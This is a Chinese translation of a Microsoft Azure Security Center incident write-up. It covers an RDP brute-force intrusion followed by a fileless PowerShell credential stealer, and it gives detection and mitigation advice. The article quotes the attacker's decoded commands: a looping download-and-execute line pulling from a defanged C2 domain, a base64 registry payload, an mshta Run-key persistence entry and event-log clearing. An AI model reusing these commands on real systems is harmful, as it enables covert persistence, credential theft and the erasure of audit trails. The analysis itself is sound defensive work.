> 原文链接: https://www.anquanke.com//post/id/87018 


# 【技术分享】Azure Security Center针对PowerShell攻击的深入分析


                                阅读量   
                                **86316**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：azure.microsoft.com
                                <br>原文地址：[https://azure.microsoft.com/en-us/blog/how-azure-security-center-unveils-suspicious-powershell-attack/](https://azure.microsoft.com/en-us/blog/how-azure-security-center-unveils-suspicious-powershell-attack/)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p3.ssl.qhimg.com/t011d8a41d6ba985f13.jpg)](https://p3.ssl.qhimg.com/t011d8a41d6ba985f13.jpg)

译者：[shan66](http://bobao.360.cn/member/contribute?uid=2522399780)

预估稿费：200RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿



**前言**

为了纪念[国家网络安全意识月（NCSAM）](https://www.dhs.gov/national-cyber-security-awareness-month)，我们发布了一篇新的系列文章，来重点介绍**Azure Security Center**是如何检测、追查和缓解现实世界所面临的各种网络攻击的。在这篇文章中，我们将向读者分析攻击者是如何使用PowerShell来运行恶意代码并收集用户凭据的。在详细介绍这一攻击手法之前，不妨先对本系列中其他文章进行一个回顾，其中Security Center能够检测到：

[**SQL暴力攻击**](https://azure.microsoft.com/en-us/blog/how-azure-security-center-helps-reveal-a-cyberattack/)

[**比特币采矿攻击**](https://azure.microsoft.com/en-us/blog/how-azure-security-center-detects-a-bitcoin-mining-attack/)

[**基于网络威胁情报的DDoS攻击**](https://azure.microsoft.com/en-us/blog/how-azure-security-center-detects-ddos-attack-using-cyber-threat-intelligence/)

[**恶意使用正常的应用程序**](https://azure.microsoft.com/en-us/blog/how-azure-security-center-aids-in-detecting-good-applications-being-used-maliciously/)

在这篇文章中，我们将介绍Azure Security Center检测到的另一个有趣的真实世界的攻击场景，并且这次调查是由我们的团队负责的。需要注意的是，为了保护隐私，受影响公司的名称、所有计算机名称和所有用户名都已进行了更换。这种特殊攻击使用PowerShell来运行内存中的恶意代码，目的是通过密码窃取、按键记录、剪贴板抓取和屏幕捕获来收集凭据信息。该攻击首先会进行**RDP Force**攻击，最终将在注册表中实现设置和配置持久自动启动（ASEP）的目的。这个案例研究不仅介绍了该攻击的原理，并提供了如何在您的环境中检测和防止类似攻击的建议。 

**<br>**

**Azure安全中心的原始警报和详细信息**

由于世界上存在许多远程管理的联网计算机，所以黑客们一直都在努力搜寻各种正在运行的远程管理服务，如远程桌面协议（RDP），以便通过暴力攻击破解密码。我们的案例是从一个大客户的Azure Security Center控制台开始的，该控制台提示存在RDP暴力攻击活动以及可疑的PowerShell活动。

在下面的Azure Security Center屏幕截图中，您可以按照从下到上的时间顺序进行查看，我们可以发现“Failed RDP Brute Force Attack”警报后面是一个“Failed RDP Brute Force Attack”警报——这表示有人通过RDP登录猜到了用户密码，在这种恶意的暴力登录警报后面，是几个异常PowerShell活动的警报。 

[![](https://p4.ssl.qhimg.com/t0143177953576d78a3.png)](https://p4.ssl.qhimg.com/t0143177953576d78a3.png)

当我们检查最初的Successful RDP Brute Force Attack警报时，可以看到攻击的时间、受到攻击的帐户、攻击源的IP地址（这里是意大利），以及Microsoft’s Threat Intel的“RDP Brute Forcing”报告的链接。 

[![](https://p2.ssl.qhimg.com/t01046ed877629d43c1.png)](https://p2.ssl.qhimg.com/t01046ed877629d43c1.png)

成功登录后，后面给出了一些高级严重性警报，并且Azure安全中心会按时间顺序显示攻击者登录成功后执行的每个命令行： 

[![](https://p4.ssl.qhimg.com/t01e4b36dce51dbed54.jpg)](https://p4.ssl.qhimg.com/t01e4b36dce51dbed54.jpg)

**<br>**

**原始的攻击和攻击者活动的细节**

根据上述警报提供的信息，我们的调查团队与客户一起审查了从攻击者最初登录时获取的帐户登录日志（事件ID 4624）和进程创建日志（事件ID 4688）。 根据原始的登录数据，我们看到攻击者使用了各种用户名和密码组合来进行持续的RDP暴力尝试。大多数失败的尝试最终会引发事件ID 4625（帐户登录失败）、状态码0xc000006d（尝试登录无效）和一个子代码0xc0000064（指定的帐号不存在）。

[![](https://p1.ssl.qhimg.com/t01fe2c4f490d1d9c73.png)](https://p1.ssl.qhimg.com/t01fe2c4f490d1d9c73.png)

在09月06日上午10:13左右，我们看到Substatus码开始发生变化。从这里可以看出，使用用户名“ContosoAdmin”导致了不同的状态码：0xc000006a（密码错误）。 之后是使用“ContosoAdmin”帐户登录成功，类型分别为3和10（远程交互）。从IP地址（188.125.100.233）来看，这次是从意大利进行登录的。 

[![](https://p3.ssl.qhimg.com/t01a6f99258ccad9a48.png)](https://p3.ssl.qhimg.com/t01a6f99258ccad9a48.png)

下面，我们来检查一下登录后的进程创建活动。攻击者首先执行了“whoami”命令，来查看当前的登录用户。然后使用net group “Domain Admins” /domain命令查看了“Domain Admins”组的成员。之后，又执行了“qwinsta”命令，来显示所有Remote Desktop Services会话。然后启动Taskmgr（Windows任务管理器）以查看或管理相应的进程和服务。

[![](https://p0.ssl.qhimg.com/t01c4b49aff3410d2be.png)](https://p0.ssl.qhimg.com/t01c4b49aff3410d2be.png)

稍后，攻击者执行了另一个PowerShell命令。该命令用Base64编码的字符串进行了混淆处理，另外，还利用Deflate压缩算法进行了压缩处理。注意：在后文中，我们会对这些Base64编码的字符串进行解码，届时我们将进一步挖掘该命令的用法。

[![](https://p4.ssl.qhimg.com/t01cbd992471f90b69e.png)](https://p4.ssl.qhimg.com/t01cbd992471f90b69e.png)

约3分钟后，攻击者从这台机器上面注销了。但是在注销之前，他们会通过清除所有事件日志来掩盖自己的踪迹。这是通过内置的wevtutil.exe（Windows事件命令行实用程序）来完成的。首先，使用"el"或"enum-logs"开关枚举所有事件日志。然后用“cl”或“清除日志”开关清除所有事件日志。以下是攻击者执行的部分事件清除命令。 

[![](https://p3.ssl.qhimg.com/t018a75333589f8dc5e.png)](https://p3.ssl.qhimg.com/t018a75333589f8dc5e.png)

**<br>**

**深入考察Base64编码的PowerShell命令**

我们对攻击者的原始命令的Base64编码的部分进行解码后，竟然出现了更多的Base64编码命令，这表明：

**嵌套的Base64混淆处理。**

**所有级别的命令执行都进行了混淆处理。**

**创建一个仅使用注册表的ASEP（自动启动扩展点）作为持久性机制。**

**恶意代码参数存储在注册表中。**

**由于ASEP和参数仅出现系统注册表中，所以这些命令可以在不借助文件或NTFS组件的情况下以“in-memory”的方式执行。**

这是攻击者执行的原始命令： 

[![](https://p4.ssl.qhimg.com/t015a2e4c23f7cb89c0.png)](https://p4.ssl.qhimg.com/t015a2e4c23f7cb89c0.png)

[![](https://p3.ssl.qhimg.com/t012b1d0fea0a2f0d31.png)](https://p3.ssl.qhimg.com/t012b1d0fea0a2f0d31.png)

解码Base64后可以看到，许多注册表项和更多的Base64字符串有待解码…… 

[![](https://p4.ssl.qhimg.com/t016337d4033f60b079.png)](https://p4.ssl.qhimg.com/t016337d4033f60b079.png)

[![](https://p3.ssl.qhimg.com/t012b1d0fea0a2f0d31.png)](https://p3.ssl.qhimg.com/t012b1d0fea0a2f0d31.png)

解码这些嵌套的Base64值后，我们发现该命令执行了以下操作：

1.    该命令首先把后面的命令用到的参数存储在HKLMSoftwareMicrosoftWindowsCurrentVersion下的名为“SeCert”的注册表单元中。



```
[HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersion]
"SeCert"="dwBoAGkAbABlACgAMQApAHsAdAByAHkAewBJAEUAWAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALg
BEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBkAG0AcwBlAHIAdgBlAHIAcwAuAGMAbwBtAC8AJwArACgAWwBjAGgAYQBy
AF0AKAA4ADUALQAoAC0AMwA3ACkAKQApACkAfQBjAGEAdABjAGgAewBTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAtAHMAIAAxADAAfQB9AA=="
```

2.    上述注册表项中的Base64值解码之后，实际上就是一条从恶意C2（C&amp;C）域（mdmservers[.]com）进行下载的命令。

```
while(1)`{`try`{`IEX(New-Object Net.WebClient).DownloadString('hxxp[:]//mdmservers[.]com/'+([char](85-(-37))))`}`catch`{`Start-Sleep -s 10`}``}`
```

3.    然后，攻击者的命令通过“HKLMSoftwareMicrosoftWindowsCurrentVersionRun”中名为“SophosMSHTA”的注册表ASEP（自动启动扩展点）实现持久性机制。



```
[HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsCurrentVersionRun]
"SophosMSHTA"="mshta vbscript:CreateObject("Wscript.Shell").Run("powershell.exe -c ""$x=$((gp HKLM:Software\Microsoft\Windows\CurrentVersion SeCert).SeCert);powershell -E $x""",0,True)(window.close)"
```

4.    该注册表的持久性能够确保机器每次启动或重启时都会启动该恶意命令。

5.    注册表ASEP会启动Microsoft脚本引擎（mshta.exe）。

6.    Mshta.exe将运行PowerShell.exe，然后，它将读取并解码HKLMSOFTWAREMicrosoftWindowsCurrentVersion-&gt;“SeCert”的值。

7.    SeCert的注册表值会通知PowerShell从hxxp[:]//mdmservers[.]com下载并启动恶意脚本。

**<br>**

**恶意代码的下载和执行**

一旦攻击者设置了持久性机制并注销，当主机下一次重新启动时，将启动PowerShell，从hxxp[:]//mdmservers[.]com下载并启动恶意payload。这个恶意脚本包含了执行特定功能的各个组成部分。下表详细说明了这个恶意payload的主要功能。

<br>

**操作**

从剪贴板中抓取内容并将输出保存到以下位置：

```
%temp%Applnsights_VisualStudio.txt
```

将所有按键记录到以下位置：

```
%temp%key.log
```

捕获初始屏幕并以.jpg格式保存到以下位置：

```
%temp%39F28DD9-0677-4EAC-91B8-2112B1515341yyyymmdd_hhmmss.jpg
```

当受害者输入某些金融或帐户凭据方面的关键词时，进行屏幕截图，并以.jpg格式保存到以下位置：

```
%temp%39F28DD9-0677-4EAC-91B8-2112B1515341yyyymmdd_hhmmss.jpg
```

检查是否安装了Google Chrome浏览器。 如果已经安装的话，就从Chrome缓存中收集所有密码并保存到以下位置：

```
%temp%Chrome.log
```

检查是否安装了Mozilla Firefox浏览器。如果已经安装的话，就从Firefox缓存中收集所有密码并保存到以下位置：

```
%temp%Firefox.log
```



**总结**

下面，我们来总结一下到目前为止的调查结果：

1.    首先，攻击者会通过RDP暴力攻击管理员帐户，如果爆破成功，入侵的第一步就成功了。

2.    然后，攻击者将执行一个通过Base64混淆处理过的PowerShell命令，该命令的作用是设置开机时启动的注册表ASEP。

3.    接着，攻击者通过使用以下命令删除所有事件日志来清除其活动的证据：wevtutil.exe -cl &lt;eventlogname&gt;。

4.    当受影响的主机启动或重新启动时，它将启动位于HKLMSOFTWAREMicrosoftWindowsCurrentVersionRun中的恶意注册表ASEP

5.    注册表ASEP会启动Microsoft脚本引擎（mshta.exe）。

6.    Mshta.exe会运行PowerShell.exe，然后它将读取并解码HKLMSOFTWAREMicrosoftWindowsCurrentVersion -&gt; ”SeCert”的值

7.    “SeCert”的值会命令PowerShell从hxxp[:]//mdmservers[.]com下载并启动恶意脚本 

然后,来自hxxp[:]//mdmservers[.]com的恶意代码将会执行以下操作：

1.    将从剪贴板中抓取得内容保存到：％temp％Applnsights_VisualStudio.txt

2.    将所有按键记录到：％temp％ key.log

3.    抓取初始屏幕并以.jpg格式保存到：％temp％39F28DD9-0677-4EAC-91B8-2112B1515341yyyymmdd_hhmmss.jpg

4.    当受害者输入某些财务或帐户凭据相关的关键字时，进行屏幕截图，并以.jpg格式保存到以下位置：％temp％39F28DD9-0677-4EAC-91B8-2112B1515341yyyymmdd_hhmmss.jpg

5.    检查是否安装了Google Chrome浏览器。如果已经安装了的话，从Chrome缓存中收集所有密码，并保存到：％temp％Chrome.log

6.    检查是否安装了Mozilla Firefox浏览器。如果已经安装了的话，从Firefox缓存中收集所有密码，并保存到：％temp％Firefox.log

该攻击的结果是信息窃取软件将从注册表自动启动，并在内存中运行，从而收集击键、浏览器密码、剪贴板数据和屏幕截图。 



**Azure Security Center如何捕获这一切的**

很明显，攻击者试图通过各种非凡的手段来掩饰自己的活动；确保使用内置的Windows可执行文件（PowerShell.exe、Mshta.exe、Wevtutil.exe）执行所有进程，使用经过混淆处理并存储在注册表中的命令参数，以及删除所有事件日志以清除其踪迹。然而，这些努力并没有能够阻止Azure Security Center检测、收集和报告该恶意活动。

正如我们在本文开头部分所看到的，Azure Security Center检测到了这次攻击的完整过程，并提供了最初的RDP暴力攻击的详细信息，并揭示了攻击者执行所有命令。在警报中还可以看出，所有混淆过的命令行都会被解密、解码，并在攻击的每个阶段以明文形式呈现。这个可以节省时间的宝贵信息有助于安全响应调查员和系统管理员了解“发生了什么事”，“什么时候发生”，“他们是怎么进入的”，“他们进入什么” ，“他们从哪里来”的一系列问题。此外，调查人员还可以确定其组织中的其他主机是否可能受到这个被入侵的主机的横向渗透的影响。对这个攻击的全面了解也可以帮助回答诸如“他们之后的目标是什么”等问题。在我们的例子中，主要目的似乎是窃取财务或账户凭据。

在我们的所有调查中，Azure Security Center在帮助确定关键细节，如初始入侵方式、攻击源、可能的横向渗透和攻击范围方面发挥了关键作用。Azure Security Center还会详细描述将来由于文件系统覆盖或日志保留/存储限制而可能丢失的组件。Azure Security Center能够使用最新的机器学习和大数据分析技术，通过各种来源来获取、存储、分析和解密数据，这对于安全分析师、事件响应人员和取证人员来说是非常有价值的。 

<br>

**推荐的补救和缓解措施**

我们可以看到，最初的攻击之所以得手是由于使用了容易猜到密码的用户帐户所导致的，之后，整个系统就被攻陷了。本例中，主机被植入了恶意的PowerShell代码，其主要目的是为了获得财务凭证或有价值得信息。 Microsoft建议通过审查可用的日志源、基于主机的分析以及取证析以帮助确定攻击过程中第一个沦陷的地方在哪里。Azure基础架构即服务（IaaS）和虚拟机（VM））提供了几个相关的功能以便于收集数据，包括将数据驱动器附加到正在运行的计算机和磁盘映像功能等。 Microsoft还建议使用恶意软件保护软件进行扫描，以帮助识别和删除主机上运行的恶意软件。如果已从被攻陷的主机识别出横向渗透，则补救措施应扩展到所有主机。

如果无法确定最初攻陷的地方在哪里的话，Microsoft建议备份关键数据并迁移到新的虚拟机。此外，新的或修复后的主机应该在连入网络之前进行安全加固，以防止重新感染。然而，如果这些无法立即执行的话，我们建议实施以下补救/预防措施：

1.    密码策略：攻击者通常使用广泛流传的工具来发起暴力攻击，这些工具利用单词列表和智能规则集来智能地自动猜测用户密码。因此，第一步是确保为所有虚拟机使用复杂的密码。应使用强制频繁更改密码的复杂密码策略，并[了解执行密码策略的最佳做法](https://technet.microsoft.com/en-us/library/ff741764.aspx)。

2.    端点：端点允许从互联网与您的虚拟机进行通信。在Azure环境中创建虚拟机时，默认情况下会创建两个端点，以帮助管理虚拟机，它们分别是远程桌面和PowerShell。建议删除任何不需要的端点，只有在需要的时候才添加它们。如果您有端点处于打开状态，建议尽可能修改所用的公共端口。创建新的Windows VM时，默认情况下，远程桌面的公共端口设置为 “Auto” ，这意味着将为您自动生成随机的公共端口。要想获取有关[如何在Azure中的经典Windows虚拟机上设置端点](https://docs.microsoft.com/en-us/azure/virtual-machines/windows/classic/setup-endpoints)的更多信息，请访问这里。

3.    启用网络安全组：Azure Security Center建议您启用网络安全组（NSG）（如果尚未启用的话）。NSG中包含了一个访问控制列表（ACL）规则列表，用来决定允许或拒绝虚拟网络中虚拟机实例的网络流量。端点ACL可以用来控制可以通过该管理协议访问的IP地址或CIDR地址子网。如果想要详细了解如何使用[网络安全组过滤网络流量](https://docs.microsoft.com/en-us/azure/virtual-network/virtual-networks-nsg)，并在[Azure Security Center中启用网络安全组](https://docs.microsoft.com/en-us/azure/security-center/security-center-enable-network-security-groups)的话，可以访问这里。

4.    使用VPN进行管理：VPN网关是一种虚拟网络网关，可以通过公共连接将加密流量发送到本地的位置。您还可以使用VPN网关通过Microsoft网络在Azure虚拟网络之间发送加密流量。为了在Azure虚拟网络和本地站点之间发送加密的网络流量，您必须为虚拟网络创建一个VPN网关。[站点到站点](https://docs.microsoft.com/en-us/azure/vpn-gateway/vpn-gateway-about-vpngateways#site-to-site-and-multi-site-ipsecike-vpn-tunnel)和[站点到站点网关](https://docs.microsoft.com/en-us/azure/vpn-gateway/vpn-gateway-about-vpngateways#a-namep2sapoint-to-site-vpn-over-sstp)的连接都允许我们完全删除公共端点，并通过安全VPN直接连接到虚拟机。

5.    网络级身份验证（NLA）：可以在主机上使用NLA，从而只让通过了域验证的用户创建远程桌面会话。由于NLA要求发起连接的用户在验明自己的身份之前，需要与服务器建立会话，因此可以有效缓解暴力、字典攻击和密码猜测攻击带来的危害。

6.    即时（JIT）网络访问：Azure Security Center中的虚拟机（VM）的即时访问技术，可用于帮助保护和锁定Azure VM的入站流量。 JIT网络访问可以通过限制端口开放的时间来缓解暴力破解攻击，同时在需要时又可以轻松为虚拟机提供相应的连接。 



**参考资源**

PowerShell团队已经做了大量的工作，使PowerShell成为最安全透明的脚本语言和shell。 以下链接详细介绍了如何解决PowerShell的相关问题：

https://blogs.msdn.microsoft.com/powershell/2015/06/09/powershell-the-blue-team/

https://www.youtube.com/watch?v=ZkJ64_tQxPU

有关恶意脚本及其输出的更多信息，请参阅以下内容：

[A most interesting PowerShell trojan [PowerShell sample and Raw Paste data provided by @JohnLaTwC]](https://pastebin.com/7wyupkjl)

[Windows Defender Malware Encyclopedia Entry: Spyware:PowerShell/Tripelog](https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Spyware%3aPowerShell%2fTripelog)
